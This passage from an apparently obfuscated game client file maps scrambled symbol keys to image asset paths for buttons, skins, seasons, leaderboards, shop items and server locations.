			"ⲆⲆⵠⲆᐃⲆᐃΔⵠ": "img/season-5-click.png",
			"ᐃⵠΔⵠⲆΔⵠⵠⲆ": "img/season5-box.png",
			"ⲆᐃⲆⲆΔΔⲆ": "img/season-6-out.png",
			"ᐃⵠΔᐃⲆᐃΔ": "img/season-6-in.png",
			"ΔᐃⲆⵠⲆᐃⵠ": "img/season-6-click.png",
			"ΔⲆⵠⲆⲆⲆΔ": "img/season6-box.png",
			"ΔⲆΔΔⲆⲆⲆ": "img/profile3-box.png",
			"ⵠᐃᐃⵠⵠⵠᐃ": "img/skins-box.png",
			"ΔᐃΔᐃⵠᐃⵠ": "img/shop-box.png",
			"ΔΔΔᐃⵠⵠⵠⵠⵠ": "img/private-server-box.png",
			"ⲆⵠⲆⲆᐃⵠᐃ": "img/location-box.png",
			"ⵠⵠⲆⵠⲆᐃⵠ": "img/server-duration-box.png",
			"ⵠⵠⵠᐃΔΔⲆ": "img/tutorial-box.png",
			"ⵠⲆΔᐃΔΔᐃ": "img/leaderboard2-box.png",
			"ᐃΔΔⵠᐃⵠᐃ": "img/buy-breads-box.png",
			"ⵠᐃᐃⲆᐃⲆᐃ": "img/bag-box.png",
			"ᐃⵠΔᐃΔᐃΔ": "img/deadbox-box.png",
			"ᐃⵠᐃᐃΔⲆΔ": "img/book-box.png",
			"Δⵠᐃⵠⵠᐃᐃ": "img/accessories-box.png",
			"ᐃᐃΔᐃⵠⵠⲆ": "img/customskin-box.png",
			"ΔⵠᐃⵠΔⵠⲆ": "img/bag-lasts.png",
			"ⲆᐃΔᐃⲆⲆΔ": "img/server-lasts.png",
			"ⵠⲆⲆⲆᐃⵠΔ": "img/server-access-box3.png",
			"ΔΔⵠᐃᐃΔⵠ": "img/lootbox-box.png",
			"ᐃΔⲆⲆᐃᐃᐃ": "img/change-nickname0.png",
			"ᐃᐃΔᐃΔΔᐃ": "img/change-nickname1.png",
			"ⲆⲆⵠᐃⵠᐃΔ": "img/cheating-box.png",
			"ᐃⲆᐃⵠᐃΔⵠΔᐃ": "img/daily-quest-box.png",
			"ⵠΔⲆⲆⲆⵠᐃᐃⲆ": "img/daily-5-bread.png",
			"ⲆᐃᐃᐃΔⵠⲆⵠⵠ": "img/daily-10-bread.png",
			"ᐃᐃᐃⲆᐃⲆⵠᐃⵠ": "img/daily-valid.png",
			"ⵠΔΔΔⵠΔΔ": "img/normal-profile-out.png",
			"ⲆⲆᐃΔⲆΔⲆ": "img/normal-profile-in.png",
			"ⵠᐃΔᐃΔⵠᐃ": "img/normal-profile-click.png",
			"ⵠⵠᐃⵠⲆⲆᐃ": "img/forest-profile-out.png",
			"ⲆᐃⵠΔⵠⵠⵠ": "img/forest-profile-in.png",
			"ΔΔⲆᐃΔᐃΔ": "img/forest-profile-click.png",
			"ΔⵠΔΔⵠᐃᐃ": "img/zombie-profile-out.png",
			"ⵠΔᐃᐃᐃⵠᐃ": "img/zombie-profile-in.png",
			"ᐃⲆⵠⵠⲆᐃᐃ": "img/zombie-profile-click.png",
			"ΔᐃⵠⵠΔΔᐃ": "img/vampire-profile-out.png",
			"ⵠᐃΔᐃⵠⲆΔ": "img/vampire-profile-in.png",
			"ⲆᐃⵠΔΔⵠᐃ": "img/vampire-profile-click.png",
			"ᐃᐃᐃᐃΔⵠⲆ": "img/total-profile-out.png",
			"ᐃⲆⵠᐃⵠⲆᐃ": "img/total-profile-in.png",
			"ⵠᐃⲆᐃᐃΔᐃ": "img/total-profile-click.png",
			"ⲆⵠᐃᐃⲆᐃᐃ": "img/season1-out.png",
			"ⲆⲆⵠΔΔᐃΔ": "img/season1-in.png",
			"ΔⵠᐃΔᐃᐃᐃ": "img/season1-click.png",
			"ⵠⵠⵠΔⲆᐃᐃ": "img/season2-out.png",
			"ᐃᐃᐃΔΔⵠΔ": "img/season2-in.png",
			"ⲆᐃᐃⵠᐃΔⵠ": "img/season2-click.png",
			"ⲆΔᐃΔⲆⵠⲆ": "img/season3-out.png",
			"ᐃᐃⵠᐃⲆΔᐃ": "img/season3-in.png",
			"ΔᐃⵠⲆⲆⵠⵠ": "img/season3-click.png",
			"ⵠⵠΔᐃᐃⵠΔ": "img/season4-out.png",
			"ⵠⲆΔⵠⲆΔΔ": "img/season4-in.png",
			"ⵠᐃⲆΔⵠΔΔ": "img/season4-click.png",
			"ᐃᐃᐃⵠᐃᐃⵠ": "img/season5-out.png",
			"ⲆΔᐃⵠΔⲆⵠ": "img/season5-in.png",
			"ᐃΔᐃⲆΔⵠⵠ": "img/season5-click.png",
			"ΔⲆΔΔⲆᐃⲆ": "img/season6-out.png",
			"ΔⵠⲆΔⲆⲆⵠ": "img/season6-in.png",
			"ΔⵠⵠⲆᐃᐃΔ": "img/season6-click.png",
			"ΔᐃⵠⵠᐃⲆΔ": "img/locked-skin-alert.png",
			"ᐃⵠᐃᐃⲆⵠⵠ": "img/locked-custom-alert.png",
			"ΔⲆⲆⲆᐃΔⲆ": "img/bg-red-locked.png",
			"ΔᐃⵠⲆⵠᐃⵠ": "img/skin-button-out.png",
			"ΔⵠᐃΔⲆⵠⲆ": "img/skin-button-in.png",
			"ᐃᐃᐃⲆⲆᐃΔ": "img/skin-button-click.png",
			"ⵠⲆⵠⲆⲆⵠΔ": "img/accessory-button-out.png",
			"ᐃⲆⲆΔⲆᐃⲆ": "img/accessory-button-in.png",
			"ᐃΔⲆⲆⲆΔΔ": "img/accessory-button-click.png",
			"ⵠΔⵠⲆᐃᐃΔ": "img/bag-button-out.png",
			"ΔⲆᐃⵠΔᐃΔ": "img/bag-button-in.png",
			"ⲆⵠⲆⵠⲆΔⵠ": "img/bag-button-click.png",
			"ΔⲆⵠᐃᐃⲆⲆ": "img/book-button-out.png",
			"ᐃⵠⲆᐃΔⵠⵠ": "img/book-button-in.png",
			"ΔᐃᐃⵠΔⵠΔ": "img/book-button-click.png",
			"ⲆΔⵠⵠⲆⲆⲆ": "img/deadbox-button-out.png",
			"ΔⵠᐃΔⲆⲆⲆ": "img/deadbox-button-in.png",
			"ΔΔΔΔⵠᐃⵠ": "img/deadbox-button-click.png",
			"ⲆⲆⲆⵠⲆΔΔ": "img/loot-button-out.png",
			"ⵠᐃᐃⲆⵠᐃᐃ": "img/loot-button-in.png",
			"ΔᐃⵠⵠΔⲆⵠ": "img/loot-button-click.png",
			"ⲆⲆΔᐃᐃⵠⲆ": "img/free-item-out.png",
			"ΔᐃⲆᐃⲆⲆΔ": "img/free-item-in.png",
			"ⲆΔΔᐃᐃᐃᐃ": "img/free-item-click.png",
			"ⲆᐃⵠⲆ": "img/wood-item-out.png",
			"ᐃΔⵠΔ": "img/wood-item-in.png",
			"ⵠⲆΔⲆ": "img/wood-item-click.png",
			"ᐃⵠᐃΔⵠΔⵠ": "img/stone-item.png",
			"ᐃΔᐃᐃΔⲆΔ": "img/stone-item-in.png",
			"ⵠᐃΔⵠⵠᐃᐃ": "img/stone-item-click.png",
			"ⵠⲆΔⲆΔΔΔ": "img/gold-item.png",
			"ⵠⵠⲆⲆⵠⵠⵠ": "img/gold-item-in.png",
			"ᐃⵠΔᐃⵠΔΔ": "img/gold-item-click.png",
			"ΔⵠᐃⵠⲆⲆᐃ": "img/diamond-item.png",
			"ⵠᐃΔⲆⵠⵠⲆ": "img/diamond-item-in.png",
			"ΔᐃⵠΔⲆⲆᐃ": "img/diamond-item-click.png",
			"ΔΔⲆⲆᐃⲆⲆ": "img/amethyst-item.png",
			"ⵠⵠⲆᐃᐃᐃⵠ": "img/amethyst-item-in.png",
			"ΔⵠⵠⲆᐃⲆⲆ": "img/amethyst-item-click.png",
			"ⵠⵠΔⵠΔⵠΔ": "img/reidite-item.png",
			"ⲆⵠΔᐃⵠᐃΔ": "img/reidite-item-in.png",
			"ⵠᐃⲆⲆⲆΔᐃ": "img/reidite-item-click.png",
			"ΔΔⲆΔⵠᐃⵠ": "img/special-item-out.png",
			"ᐃᐃⵠⲆΔⵠΔ": "img/special-item-in.png",
			"ᐃⵠⲆΔΔᐃᐃ": "img/special-item-click.png",
			"ΔΔΔⲆᐃⲆⵠ": "img/level-item-out.png",
			"ⵠⲆⲆⲆⵠⵠⵠ": "img/level-item-in.png",
			"ⲆᐃΔⲆⵠⲆΔ": "img/level-item-click.png",
			"ⲆᐃⲆᐃᐃᐃΔ": "img/skin-previous-out.png",
			"ᐃᐃᐃΔᐃᐃΔ": "img/skin-previous-in.png",
			"ⲆᐃⵠᐃⵠⵠⲆ": "img/skin-previous-click.png",
			"ᐃⲆⵠΔⲆΔᐃ": "img/skin-next-out.png",
			"ⵠΔΔΔΔⲆⲆ": "img/skin-next-in.png",
			"ΔⲆᐃΔⲆⵠⵠ": "img/skin-next-click.png",
			"ⲆⵠᐃⲆᐃ": "img/back-button-out.png",
			"ᐃᐃⲆΔΔ": "img/back-button-in.png",
			"ᐃⵠⵠΔᐃ": "img/back-button-click.png",
			"ⵠΔΔΔⵠⲆΔ": "img/get-more-button-out.png",
			"ⲆⲆᐃⵠᐃⲆᐃ": "img/get-more-button-in.png",
			"ⲆᐃⵠⵠⲆⵠⵠ": "img/get-more-button-click.png",
			"ⲆΔⵠᐃⵠⲆⲆ": "img/currency1-out.png",
			"ᐃΔΔⲆⲆΔⵠ": "img/currency1-in.png",
			"ⲆᐃⲆΔᐃⲆⵠ": "img/currency1-click.png",
			"ⵠᐃᐃᐃᐃⲆⲆ": "img/currency2-out.png",
			"ⵠⲆΔⲆΔⵠᐃ": "img/currency2-in.png",
			"ⲆⲆᐃⲆᐃⵠⲆ": "img/currency2-click.png",
			"ⲆΔᐃΔⲆⲆᐃ": "img/currency3-out.png",
			"ⲆⲆⲆⲆⵠⲆⲆ": "img/currency3-in.png",
			"ⲆΔΔⲆⵠⲆⵠ": "img/currency3-click.png",
			"ⲆΔⲆᐃᐃⵠⵠ": "img/currency4-out.png",
			"ⲆΔᐃΔΔⵠⲆ": "img/currency4-in.png",
			"ᐃⵠΔⲆⵠⲆΔ": "img/currency4-click.png",
			"ΔᐃᐃᐃⵠΔⵠ": "img/currency5-out.png",
			"ⵠΔᐃᐃⵠΔᐃ": "img/currency5-in.png",
			"ⲆⵠΔᐃΔⲆⲆ": "img/currency5-click.png",
			"ⲆᐃᐃᐃᐃΔⵠ": "img/price1-out.png",
			"ᐃΔᐃⵠⵠᐃⲆ": "img/price1-in.png",
			"ⲆΔⵠⵠⲆᐃᐃ": "img/price1-click.png",
			"ᐃⵠᐃᐃΔᐃⲆ": "img/price2-out.png",
			"ⵠᐃΔⵠⵠⲆⲆ": "img/price2-in.png",
			"ⲆΔΔⲆⵠΔⲆ": "img/price2-click.png",
			"ᐃⲆΔⵠⲆⲆⲆ": "img/price3-out.png",
			"ᐃΔⵠΔΔⵠⲆ": "img/price3-in.png",
			"ᐃⲆΔⵠΔⲆᐃ": "img/price3-click.png",
			"ΔⵠⲆᐃΔᐃΔ": "img/price4-out.png",
			"ᐃΔΔⵠⲆᐃΔ": "img/price4-in.png",
			"ⵠⲆⵠⵠⵠΔΔ": "img/price4-click.png",
			"ᐃᐃⵠᐃᐃⵠⲆ": "img/price5-out.png",
			"ΔΔᐃⵠΔΔΔ": "img/price5-in.png",
			"ᐃⵠⵠⲆΔᐃⵠ": "img/price5-click.png",
			"ⵠⵠᐃΔⲆᐃᐃⵠⵠ": "img/buy-private-server-out.png",
			"ⵠⵠΔᐃΔᐃᐃᐃᐃ": "img/buy-private-server-in.png",
			"ΔⵠⵠⵠⲆⲆΔⲆⲆ": "img/buy-private-server-click.png",
			"ⵠΔᐃΔᐃⵠⲆ": "img/atlanta-button-out.png",
			"ΔᐃⵠΔΔⲆⲆ": "img/atlanta-button-in.png",
			"ᐃⵠΔΔⵠⲆⲆ": "img/atlanta-button-click.png",
			"ΔⲆⵠⲆⲆⵠⲆ": "img/los-angeles-button-out.png",
			"ᐃᐃⲆᐃᐃⲆΔ": "img/los-angeles-button-in.png",
			"ⲆᐃᐃⵠΔⲆⲆ": "img/los-angeles-button-click.png",
			"ᐃᐃⵠⵠΔⲆⲆ": "img/sydney-button-out.png",
			"ⵠⵠⵠᐃⲆᐃⵠ": "img/sydney-button-in.png",
			"ⵠⲆΔᐃⵠⲆΔ": "img/sydney-button-click.png",
			"ᐃⵠⲆΔΔⲆⵠ": "img/frankfurt-button-out.png",
			"ᐃΔᐃⵠⵠΔΔ": "img/frankfurt-button-in.png",
			"ⲆΔⲆⵠⵠΔⵠ": "img/frankfurt-button-click.png",
			"ⲆⲆᐃⵠΔⲆⲆ": "img/osaka-button-out.png",
			"ᐃΔᐃΔⲆⵠΔ": "img/osaka-button-in.png",
			"ΔΔⲆⵠᐃᐃⵠ": "img/osaka-button-click.png",
			"ⲆᐃⵠΔΔΔⲆΔⵠ": "img/yes-location-out.png",
			"ᐃᐃⵠᐃΔⲆⵠⲆΔ": "img/yes-location-in.png",
			"ΔⵠⲆⲆⲆᐃⵠΔⲆ": "img/yes-location-click.png",
			"ⵠⲆᐃᐃΔⵠᐃ": "img/3days-button-out.png",
			"ᐃⲆᐃⲆⵠΔⲆ": "img/3days-button-in.png",
			"ΔΔᐃΔᐃᐃᐃ": "img/3days-button-click.png",
			"ᐃΔᐃⲆⲆᐃΔ": "img/7days-button-out.png",
			"ΔⵠΔΔⲆⵠⲆ": "img/7days-button-in.png",
			"ⲆᐃⵠⲆᐃΔⲆ": "img/7days-button-click.png",
			"ⲆⵠΔⲆΔᐃΔ": "img/30days-button-out.png",
			"ᐃᐃⵠⵠⲆⵠᐃ": "img/30days-button-in.png",
			"ΔⲆⵠⵠⲆΔⲆ": "img/30days-button-click.png",
			"ⲆΔⲆΔⲆΔⵠ": "img/90days-button-out.png",
			"ⲆᐃᐃⵠⵠⵠΔ": "img/90days-button-in.png",
			"ᐃⲆⲆΔΔⲆⵠ": "img/90days-button-click.png",
			"ᐃⲆᐃⲆᐃΔΔ": "img/spin1.png",
			"ⵠΔΔⲆΔⲆⲆ": "img/spin2.png",
			"ⵠⵠᐃᐃⲆᐃΔ": "img/spin3.png",
			"ᐃⵠᐃⲆᐃΔΔ": "img/spin4.png",
			"ⵠⲆΔΔΔⵠΔ": "img/spin5.png",
			"ⵠΔᐃⵠᐃⵠᐃ": "img/spin6.png",
			"ⲆⵠᐃᐃⲆΔⲆ": "img/arrow-spin.png",
			"ΔᐃⲆⵠⵠⵠᐃ": "img/spin-button-1-out.png",
			"ⲆᐃⵠΔΔΔⵠ": "img/spin-button-1-in.png",
			"ⵠⵠΔΔΔⲆⵠ": "img/spin-button-1-click.png",
			"ᐃᐃᐃⵠⵠᐃⲆ": "img/spin-button-2-out.png",
			"ᐃⲆΔΔΔⲆⲆ": "img/spin-button-2-in.png",
			"ⵠᐃᐃⵠᐃⲆⵠ": "img/spin-button-2-click.png",
			"ⵠⲆⵠΔⵠⲆⵠ": "img/spin-button-3-out.png",
			"ᐃⲆΔⲆᐃᐃᐃ": "img/spin-button-3-in.png",
			"ⲆᐃⲆΔᐃⵠΔ": "img/spin-button-3-click.png",
			"ⲆⲆⲆᐃΔΔᐃ": "img/spin-button-4-out.png",
			"ⵠⲆⲆΔⵠΔΔ": "img/spin-button-4-in.png",
			"ᐃΔⲆΔⲆᐃⲆ": "img/spin-button-4-click.png",
			"ⵠᐃΔⵠΔⲆΔ": "img/spin-button-5-out.png",
			"ⵠΔᐃᐃΔᐃΔ": "img/spin-button-5-in.png",
			"ᐃⲆᐃᐃⲆΔΔ": "img/spin-button-5-click.png",
			"ΔᐃⲆᐃⵠᐃⲆ": "img/spin-light.png",
			"ⲆⲆΔΔⲆΔΔ": "img/tuto-wiki-out.png",
			"ⵠΔΔⵠⲆⵠᐃ": "img/tuto-wiki-in.png",
			"ⲆⲆᐃⵠⲆⵠⵠ": "img/tuto-wiki-click.png",
			"ᐃⵠΔⲆⲆⲆΔ": "img/tuto-previous-out.png",
			"ⵠⲆⵠᐃⲆⲆⲆ": "img/tuto-previous-in.png",
			"ⲆⲆᐃⵠᐃⵠⵠ": "img/tuto-previous-click.png",
			"ᐃᐃΔᐃΔΔⵠ": "img/tuto-next-out.png",
			"ΔⵠΔΔⵠᐃΔ": "img/tuto-next-in.png",
			"ᐃΔΔᐃⵠᐃⵠ": "img/tuto-next-click.png",
			"ᐃᐃΔᐃᐃΔⲆ": "img/time-leaderboard-out.png",
			"ΔᐃⲆᐃᐃⲆΔ": "img/time-leaderboard-in.png",
			"ᐃⲆⵠΔⲆΔⵠ": "img/time-leaderboard-click.png",
			"ⲆᐃⲆΔⵠⲆΔ": "img/score-leaderboard-out.png",
			"ⲆⲆᐃⵠⲆΔⵠ": "img/score-leaderboard-in.png",
			"ⵠᐃᐃⵠΔⲆΔ": "img/score-leaderboard-click.png",
			"ΔⲆⵠᐃⲆⵠᐃ": "img/lvl-leaderboard-out.png",
			"ΔᐃΔⵠᐃⲆΔ": "img/lvl-leaderboard-in.png",
			"ᐃⲆⵠᐃⲆᐃⵠ": "img/lvl-leaderboard-click.png",
			"ᐃΔⵠΔⲆⵠΔ": "img/kill-leaderboard-out.png",
			"ᐃΔⵠⵠᐃΔΔ": "img/kill-leaderboard-in.png",
			"ΔΔΔⵠᐃΔΔ": "img/kill-leaderboard-click.png",
			"ⲆⵠᐃᐃᐃΔΔ": "img/all-leaderboard-out.png",
			"ᐃⵠⲆᐃᐃᐃᐃ": "img/all-leaderboard-in.png",
			"ᐃΔΔⵠΔᐃΔ": "img/all-leaderboard-click.png",
			"ΔΔⲆⵠⲆⵠⲆ": "img/today-leaderboard-out.png",
			"ΔᐃⲆⵠᐃΔᐃ": "img/today-leaderboard-in.png",
			"ⵠⵠᐃⵠᐃⲆⵠ": "img/today-leaderboard-click.png",
			"ⲆΔⵠΔⲆᐃⵠ": "img/week-leaderboard-out.png",
			"ⲆᐃⲆᐃΔⵠⵠ": "img/week-leaderboard-in.png",
			"ⲆᐃᐃⲆᐃⲆᐃ": "img/week-leaderboard-click.png",
			"ᐃΔⲆⵠⲆⲆΔ": "img/season1-out.png",
			"ΔⵠⵠᐃΔⵠᐃ": "img/season1-in.png",
			"ⲆⵠᐃᐃⲆΔᐃ": "img/season1-click.png",
			"ᐃΔᐃᐃΔΔΔ": "img/season2-out.png",
			"ⵠⵠᐃⲆᐃⲆⲆ": "img/season2-in.png",
			"ⲆⲆᐃⵠΔⲆΔ": "img/season2-click.png",
			"ᐃᐃⲆⲆᐃᐃⵠ": "img/season3-out.png",
			"ⲆΔΔΔⵠᐃΔ": "img/season3-in.png",
			"ⵠⵠᐃⲆⵠⵠᐃ": "img/season3-click.png",
			"ⲆⲆⵠⲆᐃⵠⲆ": "img/season4-out.png",
			"ᐃᐃⲆⲆΔⲆΔ": "img/season4-in.png",
			"ⵠᐃⲆⵠΔⲆΔ": "img/season4-click.png",
			"ⵠⲆΔⲆⲆΔⲆ": "img/season5-out.png",
			"ᐃⲆᐃⵠⲆⲆⵠ": "img/season5-in.png",
			"ⲆⵠⲆⵠⲆⵠⵠ": "img/season5-click.png",
			"ⲆΔᐃⲆⲆⲆⵠ": "img/season6-out.png",
			"ᐃⲆⲆΔᐃᐃⲆ": "img/season6-in.png",
			"ⲆⲆᐃⵠⵠᐃᐃ": "img/season6-click.png",
			"ⲆᐃΔⵠⵠⲆⵠ": "img/total-lead-out.png",
			"ᐃⵠΔⲆⲆⵠᐃ": "img/total-lead-in.png",
			"ⵠᐃⲆⵠⵠⵠΔ": "img/total-lead-click.png",
			"ⵠᐃⵠⵠⲆⵠᐃ": "img/normal-lead-out.png",
			"ᐃⲆⵠⲆΔΔⲆ": "img/normal-lead-in.png",
			"ⵠⵠΔⵠⲆⲆⲆ": "img/normal-lead-click.png",
			"ᐃᐃⲆᐃΔᐃΔ": "img/forest-lead-out.png",
			"ΔΔΔᐃᐃΔⵠ": "img/forest-lead-in.png",
			"ⵠⲆⵠⵠᐃΔⲆ": "img/forest-lead-click.png",
			"ΔⵠⵠᐃΔⵠⲆ": "img/vampire-lead-out.png",
			"ⲆΔⵠⵠᐃⲆⲆ": "img/vampire-lead-in.png",
			"ᐃⵠΔⲆⲆΔᐃ": "img/vampire-lead-click.png",
			"ΔΔⵠⵠⵠⵠⲆ": "img/zombie-lead-out.png",
			"ΔⲆΔΔᐃΔΔ": "img/zombie-lead-in.png",
			"ΔⵠΔᐃᐃᐃᐃ": "img/zombie-lead-click.png",
			"ⲆⵠⲆⲆⲆⲆⲆ": "img/day-level5.png",
			"ᐃΔΔᐃⵠΔᐃ": "img/night-level5.png",
			"ⲆⵠⲆⵠΔᐃⲆ": "img/day-level10.png",
			"ⲆⵠⲆΔⲆΔΔ": "img/night-level10.png",
			"ⲆᐃΔΔⵠⲆⵠ": "img/day-level15.png",
			"ΔⲆⲆⲆΔᐃΔ": "img/night-level15.png",
			"ⲆΔΔΔᐃⵠᐃ": "img/day-level20.png",
			"ⲆΔΔΔᐃΔᐃ": "img/night-level20.png",
			"ⲆΔⵠⵠᐃΔⲆ": "img/day-level25.png",
			"ⲆᐃΔΔᐃΔⲆ": "img/night-level25.png",
			"ⲆΔⲆΔⵠᐃΔ": "img/day-level30.png",
			"ΔⲆΔᐃᐃⲆᐃ": "img/night-level30.png",
			"ᐃΔΔᐃⲆⲆΔ": "img/day-level35.png",
			"ⵠᐃⲆᐃⵠᐃΔ": "img/night-level35.png",
			"ⲆⲆⵠⲆⲆΔⲆ": "img/day-level40.png",
			"ᐃΔⲆⲆⵠⵠⲆ": "img/night-level40.png",
			"ΔΔⲆᐃⲆΔᐃ": "img/day-level45.png",
			"ΔᐃᐃΔⲆΔᐃ": "img/night-level45.png",
			"ⲆΔᐃᐃΔⲆⲆ": "img/day-level50.png",
			"ⲆⵠⲆΔᐃΔⲆ": "img/night-level50.png",
			"ΔⲆⲆⵠΔⵠⲆ": "img/day-level55.png",
			"ᐃⲆⵠΔᐃΔⵠ": "img/night-level55.png",
			"ⲆⲆΔΔΔⲆⲆ": "img/day-level60.png",
			"ⵠⵠᐃΔᐃⵠⵠ": "img/night-level60.png",
			"ⲆⵠΔΔⲆⵠⵠ": "img/day-skin-devast0.png",
			"ᐃⲆⲆᐃⵠΔᐃ": "img/night-skin-devast0.png",
			"ⵠΔᐃⲆⵠΔⵠ": "img/day-hand-devaster.png",
			"ⲆΔⵠⲆᐃⵠΔ": "img/night-hand-devaster.png",
			"ᐃᐃⲆᐃΔⲆΔ": "img/day-skin-star0.png",
			"ⵠᐃⵠᐃⲆⵠΔ": "img/night-skin-star0.png",
			"ᐃⲆΔⲆⲆⵠⲆ": "img/day-hand-star0.png",
			"ⵠⵠⲆⵠⵠᐃΔ": "img/night-hand-star0.png",
			"ᐃⲆᐃⲆΔΔⵠ": "img/day-vampire.png",
			"ⵠΔᐃⵠⲆᐃⲆ": "img/night-vampire.png",
			"ΔΔⵠΔΔᐃⵠ": "img/day-hand-vampire.png",
			"ⵠΔⵠᐃⵠⵠΔ": "img/night-hand-vampire.png",
			"ᐃᐃᐃⵠⲆΔΔ": "img/day-zombie.png",
			"ⲆᐃⲆΔⵠⵠΔ": "img/night-zombie.png",
			"ⵠᐃᐃᐃⵠⵠΔ": "img/day-hand-zombie.png",
			"ⲆⲆᐃⵠᐃΔᐃ": "img/night-hand-zombie.png",
			"ⵠᐃⲆᐃᐃⵠΔ": "img/day-skin113.png",
			"ΔⲆΔⵠⲆᐃΔ": "img/night-skin113.png",
			"ΔⲆⲆⵠⵠΔⵠ": "img/day-hand-skin113.png",
			"ᐃⲆⵠΔΔⲆΔ": "img/night-hand-skin113.png",
			"ⲆⵠᐃⲆⲆᐃΔ": "img/day-skin0.png",
			"ⵠΔⵠᐃΔΔⵠ": "img/night-skin0.png",
			"ΔΔⲆᐃΔΔⵠ": "img/day-skin1.png",
			"ΔΔⲆΔᐃᐃⵠ": "img/night-skin1.png",
			"ⵠⲆⲆⵠⲆΔΔ": "img/day-skin2.png",
			"ⵠΔᐃⲆⵠⵠΔ": "img/night-skin2.png",
			"ᐃⵠⲆΔⵠΔΔ": "img/day-skin3.png",
			"ᐃⵠᐃⲆⲆᐃⵠ": "img/night-skin3.png",
			"ⲆⲆⵠⲆⵠΔᐃ": "img/day-skin4.png",
			"ΔⲆⵠᐃⵠΔⲆ": "img/night-skin4.png",
			"ΔᐃⲆⲆⲆᐃⲆ": "img/day-skin5.png",
			"ΔᐃᐃᐃΔᐃⵠ": "img/night-skin5.png",
			"ΔᐃᐃᐃΔⵠⵠ": "img/day-skin6.png",
			"ⲆⵠΔΔᐃᐃΔ": "img/night-skin6.png",
			"ⲆᐃΔΔⵠᐃⵠ": "img/day-skin7.png",
			"ΔΔⵠᐃⵠⲆΔ": "img/night-skin7.png",
			"ⲆⵠⵠᐃΔⵠⲆ": "img/day-skin8.png",
			"ᐃᐃⲆᐃⲆⵠᐃ": "img/night-skin8.png",
			"ᐃⲆΔⵠᐃΔᐃ": "img/day-skin9.png",
			"ΔⵠᐃᐃΔⲆᐃ": "img/night-skin9.png",
			"ΔᐃⵠΔΔⲆΔ": "img/day-skin10.png",
			"ᐃⲆᐃⵠᐃⵠΔ": "img/night-skin10.png",
			"ⲆᐃⵠⲆⵠⵠΔ": "img/day-skin11.png",
			"ΔᐃΔⲆⵠᐃΔ": "img/night-skin11.png",
			"ⲆⲆⵠΔᐃⲆΔ": "img/day-skin12.png",
			"ⵠⵠⵠΔⵠΔΔ": "img/night-skin12.png",
			"ⲆⲆⵠΔⵠᐃⲆ": "img/day-skin13.png",
			"ΔΔⲆΔⵠᐃΔ": "img/night-skin13.png",
			"ⲆⲆⵠⵠΔᐃⵠ": "img/day-skin14.png",
			"ⵠⲆⵠΔⲆΔⲆ": "img/night-skin14.png",
			"ⲆⵠΔᐃΔᐃⲆ": "img/day-skin15.png",
			"ΔᐃⵠⵠᐃⵠⲆ": "img/night-skin15.png",
			"ⲆⵠⲆⵠⵠᐃᐃ": "img/day-skin16.png",
			"ᐃⵠΔᐃⵠᐃⵠ": "img/night-skin16.png",
			"ⲆⲆΔⲆᐃⲆΔ": "img/day-skin17.png",
			"ⲆᐃᐃΔⵠᐃⲆ": "img/night-skin17.png",
			"ΔⵠΔⵠⵠⲆΔ": "img/day-skin18.png",
			"ΔᐃⲆⲆⵠⲆⲆ": "img/night-skin18.png",
			"ΔᐃⵠΔⵠⲆΔ": "img/day-skin19.png",
			"ΔΔᐃⲆᐃᐃⲆ": "img/night-skin19.png",
			"ΔᐃⲆΔⵠⲆᐃ": "img/day-skin20.png",
			"ⵠΔΔΔⲆⵠⲆ": "img/night-skin20.png",
			"ᐃⲆⲆⲆⲆΔⲆ": "img/day-skin21.png",
			"ⵠⲆⲆⵠΔᐃⲆ": "img/night-skin21.png",
			"ⲆⲆⵠΔⲆΔᐃ": "img/day-skin22.png",
			"ⵠⲆΔⵠᐃᐃΔ": "img/night-skin22.png",
			"ᐃΔΔᐃΔΔⵠ": "img/day-skin23.png",
			"ΔⲆᐃⵠⵠⲆⵠ": "img/night-skin23.png",
			"ⵠᐃⲆᐃᐃⲆⲆ": "img/day-skin24.png",
			"ᐃⲆΔΔΔⵠᐃ": "img/night-skin24.png",
			"ⲆⲆⲆᐃⲆΔᐃ": "img/day-skin25.png",
			"ⲆΔᐃⲆⲆᐃΔ": "img/night-skin25.png",
			"ΔᐃⲆᐃⵠΔΔ": "img/day-skin26.png",
			"ⵠⲆⲆⵠᐃⵠᐃ": "img/night-skin26.png",
			"ⵠⲆⲆⵠⵠⵠⲆ": "img/day-skin27.png",
			"ᐃΔΔⲆⵠΔΔ": "img/night-skin27.png",
			"ⲆⲆΔⵠⲆⵠⵠ": "img/day-skin28.png",
			"ⵠΔΔᐃΔⲆΔ": "img/night-skin28.png",
			"ᐃⲆⵠΔⲆᐃⲆ": "img/day-skin29.png",
			"ΔⵠⵠⲆⲆⵠⲆ": "img/night-skin29.png",
			"ⲆΔⵠᐃΔΔᐃ": "img/day-skin30.png",
			"ΔⵠⵠⵠⵠⵠⲆ": "img/night-skin30.png",
			"ⵠΔⵠΔᐃⲆᐃ": "img/day-skin31.png",
			"ᐃⵠⵠΔⲆᐃⵠ": "img/night-skin31.png",
			"ᐃⲆΔⲆΔⵠⵠ": "img/day-skin32.png",
			"ΔΔⲆΔΔⲆΔ": "img/night-skin32.png",
			"ΔᐃΔΔⲆᐃᐃ": "img/day-skin33.png",
			"ΔᐃᐃᐃᐃᐃΔ": "img/night-skin33.png",
			"ⲆΔΔΔⲆΔⵠ": "img/day-skin34.png",
			"ᐃΔⲆᐃΔⲆⵠ": "img/night-skin34.png",
			"ΔΔΔⲆΔΔᐃ": "img/day-skin35.png",
			"ᐃⲆᐃⲆⲆⲆⵠ": "img/night-skin35.png",
			"ᐃᐃᐃⲆⵠⵠᐃ": "img/day-skin36.png",
			"ᐃⵠⵠΔΔⵠᐃ": "img/night-skin36.png",
			"ⵠⲆⵠⵠΔΔᐃ": "img/day-skin37.png",
			"ΔⵠⲆⵠΔⵠⲆ": "img/night-skin37.png",
			"ΔΔⵠⲆᐃᐃΔ": "img/day-skin38.png",
			"ΔΔⲆΔᐃⲆΔ": "img/night-skin38.png",
			"ⲆΔΔᐃΔᐃΔ": "img/day-skin39.png",
			"ⲆⲆⵠᐃⵠⵠΔ": "img/night-skin39.png",
			"ⵠⵠᐃⵠⵠᐃᐃ": "img/day-skin40.png",
			"ⵠΔΔⵠⲆⲆΔ": "img/night-skin40.png",
			"ΔⵠⵠᐃΔⲆΔ": "img/day-skin41.png",
			"ⲆⲆᐃⲆⵠᐃⲆ": "img/night-skin41.png",
			"ⵠΔⵠⲆΔᐃΔ": "img/day-skin42.png",
			"ᐃΔⵠⵠᐃᐃⲆ": "img/night-skin42.png",
			"ᐃΔᐃⵠⲆΔΔ": "img/day-skin43.png",
